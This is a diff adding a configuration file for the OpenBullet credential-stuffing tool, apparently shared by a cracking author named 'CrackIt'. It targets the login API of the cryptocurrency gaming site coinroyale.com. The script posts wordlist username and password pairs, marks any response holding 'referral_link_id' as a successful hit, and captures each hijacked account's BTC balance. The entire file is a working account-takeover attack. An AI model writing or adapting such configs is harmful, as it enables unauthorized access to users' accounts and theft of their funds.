@@ -1,0 +1,38 @@
+[SETTINGS]
+{
+  "Name": "coinroyale.com",
+  "SuggestedBots": 1,
+  "LastModified": "2019-02-28T10:25:28.0228254+01:00",
+  "AdditionalInfo": "",
+  "Author": "CrackIt",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://api.coinroyale.com/api/session" AutoRedirect=TRUE 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json;charset=UTF-8" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "referral_link_id" 
+  KEYCHAIN Failure OR 
+    KEY "Not authorized." 
+    KEY "Invalid JSON" 
+PARSE "<SOURCE>" LR "c\":" ",\"c" Recursive=FALSE -> CAP "BTC" "" "" 
